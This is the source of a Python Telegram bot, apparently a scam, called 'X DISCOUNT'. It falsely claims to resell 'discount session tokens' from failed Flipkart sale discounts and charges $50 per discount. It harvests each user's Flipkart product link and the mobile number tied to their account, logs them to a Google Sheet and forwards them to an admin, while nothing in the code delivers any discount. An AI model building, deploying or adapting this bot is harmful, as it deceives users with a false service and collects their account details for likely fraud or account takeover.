import io
import os
import re
import threading
import telebot
from flask import Flask, jsonify
from telebot import types
import requests

# 1. Flask App Setup
app = Flask(__name__)


@app.route("/")
def home():
    return jsonify({"status": "success", "message": "Bot is running!"})


# 2. Variables & Setup
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyrtnD0DH81Jx_kUzSwYRTbG6uUNZ3bsOFSDweVrLAcByL3aDxWw6cvwxGGCGCoDjX7pQ/exec"
IMAGE_URL = "https://ik.imagekit.io/Rajmalik99/1786595036231.png"
ADMIN_ID = 8844584255

# यूजर के अस्थायी इनपुट स्टोर करने के लिए
user_data = {}


# --- Helper Functions for Google Sheet ---
def get_user_from_sheet(user_id):
    try:
        response = requests.get(
            f"{WEB_APP_URL}?action=getUser&userId={user_id}"
        )
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        print(f"Error fetching user: {e}")
    return None


def save_user_to_sheet(user_id, free_trial=2):
    try:
        payload = {
            "action": "addUser",
            "userId": str(user_id),
            "freeTrial": free_trial,
        }
        requests.post(WEB_APP_URL, json=payload)
    except Exception as e:
        print(f"Error saving user: {e}")


def update_user_details_in_sheet(user_id, free_trial, link, number):
    try:
        payload = {
            "action": "updateUser",
            "userId": str(user_id),
            "freeTrial": free_trial,
            "link": link,
            "number": number,
        }
        requests.post(WEB_APP_URL, json=payload)
    except Exception as e:
        print(f"Error updating user: {e}")


# --- Telegram Bot Handlers ---


# 1. /Start Command
@bot.message_handler(commands=["start"])
def send_welcome(message):
    user_id = str(message.from_user.id)
    first_name = message.from_user.first_name

    # शीट से यूजर डेटा चेक करें
    sheet_data = get_user_from_sheet(user_id)

    if not sheet_data or not sheet_data.get("exists"):
        # अगर नया यूजर है तो 2 फ्री ट्रायल के साथ सेव करें
        save_user_to_sheet(user_id, free_trial=2)

    welcome_text = f"Hello ! {first_name}\nThis is X DISCOUNT ⚔️"

    markup = types.InlineKeyboardMarkup()
    btn_who = types.InlineKeyboardButton(
        "Who are we", callback_data="who_are_we"
    )
    markup.add(btn_who)

    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)


# 2. Callback Handlers (Buttons Action)
@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    user_id = str(call.from_user.id)

    # "Who are we" Button
    if call.data == "who_are_we":
        caption_text = (
            "X DISCOUNT is a Dumping server of failed discounts from big sales like "
            "<i><b>BIG BILLION DAY</b></i> , <i><b>GOAT SALE</b></i> , "
            "<i><b>BIG DIWALI SALE</b></i> , <i><b>FLIPCART BLACK FRIDAY SALE</b></i>.\n\n"
            "so when the sale is live there is too much load on server that's why the discount failed "
            "and discount session tokens comes to our server."
        )

        markup = types.InlineKeyboardMarkup()
        btn_get_discount = types.InlineKeyboardButton(
            "Get Discount", callback_data="get_discount"
        )
        markup.add(btn_get_discount)

        # पुराने मैसेज को डिलीट करके फोटो और नया टेक्स्ट भेजना
        bot.delete_message(call.message.chat.id, call.message.message_id)

        try:
            response = requests.get(IMAGE_URL)
            if response.status_code == 200:
                photo_bytes = io.BytesIO(response.content)
                bot.send_photo(
                    call.message.chat.id,
                    photo_bytes,
                    caption=caption_text,
                    parse_mode="HTML",
                    reply_markup=markup,
                )
            else:
                bot.send_message(
                    call.message.chat.id,
                    caption_text,
                    parse_mode="HTML",
                    reply_markup=markup,
                )
        except Exception:
            bot.send_message(
                call.message.chat.id,
                caption_text,
                parse_mode="HTML",
                reply_markup=markup,
            )

    # "Get Discount" Button
    elif call.data == "get_discount":
        sheet_data = get_user_from_sheet(user_id)
        trials_left = sheet_data.get("freeTrial", 0) if sheet_data else 0

        msg_text = "This service is not free the service charge $50/DISCOUNT."

        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_free = types.InlineKeyboardButton(
            f"Free {trials_left} discount left", callback_data="use_free_trial"
        )
        btn_buy = types.InlineKeyboardButton(
            "Buy Discount", callback_data="buy_discount"
        )
        markup.add(btn_free, btn_buy)

        bot.send_message(call.message.chat.id, msg_text, reply_markup=markup)

    # "Free Discount Left" Button
    elif call.data == "use_free_trial":
        sheet_data = get_user_from_sheet(user_id)
        trials_left = int(
            sheet_data.get("freeTrial", 0) if sheet_data else 0
        )

        if trials_left <= 0:
            bot.answer_callback_query(
                call.id,
                "आपकी फ्री ट्रायल सीमा समाप्त हो चुकी है!",
                show_alert=True,
            )
            return

        bot.send_message(
            call.message.chat.id, "Send Your Flipcart Product Link"
        )
        bot.register_next_step_handler(call.message, process_flipkart_link)

    # "Confirm" Button
    elif call.data == "confirm_details":
        if user_id in user_data:
            link = user_data[user_id].get("link")
            number = user_data[user_id].get("number")

            # शीट से पुराना ट्रायल काउंट प्राप्त करें
            sheet_data = get_user_from_sheet(user_id)
            current_trials = int(
                sheet_data.get("freeTrial", 2) if sheet_data else 2
            )
            new_trials = max(0, current_trials - 1)

            # बैकएंड Google Sheet अपडेट करें
            update_user_details_in_sheet(user_id, new_trials, link, number)

            # एडमिन को मैसेज भेजें
            admin_msg = f"🚨 **New Discount Request** 🚨\n\n**User ID:** `{user_id}`\n**Link:** {link}\n**Number:** `{number}`"
            try:
                bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
            except Exception as e:
                print(f"Failed to send message to admin: {e}")

            # यूजर को रिप्लाई दें
            final_msg = (
                "Turn on bot notification we will send you the best discount under 24hr .\n"
                "Thanks to use X DISCOUNT."
            )
            bot.send_message(call.message.chat.id, final_msg)

            # टेम्परेरी डेटा साफ़ करें
            del user_data[user_id]


# 3. Next Step Handlers (Link & Number Validation)
def process_flipkart_link(message):
    user_id = str(message.from_user.id)
    text = message.text.strip()

    # फ्लिपकार्ट लिंक वैलीडेशन
    if "flipkart.com" in text or "fkrt.it" in text:
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["link"] = text

        msg = (
            "Send Your Flipcart Mobile Number ⚠️ "
            "We did'nt call/sms for otp do not share any other details then account number."
        )
        bot.send_message(message.chat.id, msg)
        bot.register_next_step_handler(message, process_mobile_number)
    else:
        bot.send_message(
            message.chat.id,
            "Invalid link! Please send a valid Flipkart product link.",
        )
        bot.register_next_step_handler(message, process_flipkart_link)


def process_mobile_number(message):
    user_id = str(message.from_user.id)
    number_text = message.text.strip()

    # 10 अंको का मोबाइल नंबर वैलीडेशन
    if re.match(r"^\d{10}$", number_text):
        if user_id in user_data:
            user_data[user_id]["number"] = number_text

            link = user_data[user_id]["link"]

            confirm_text = (
                f"Please confirm your details:\n\n"
                f"<b>Link:</b> {link}\n"
                f"<b>Number:</b> {number_text}"
            )

            markup = types.InlineKeyboardMarkup()
            btn_confirm = types.InlineKeyboardButton(
                "Confirm", callback_data="confirm_details"
            )
            markup.add(btn_confirm)

            bot.send_message(
                message.chat.id,
                confirm_text,
                parse_mode="HTML",
                reply_markup=markup,
            )
    else:
        bot.send_message(
            message.chat.id,
            "Invalid number! Please send a valid 10-digit mobile number.",
        )
        bot.register_next_step_handler(message, process_mobile_number)


# 4. Background Execution Setup
def run_bot():
    print("Telegram Bot starting...")
    bot.infinity_polling()


if __name__ == "__main__":
    threading.Thread(target=run_bot).start()

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
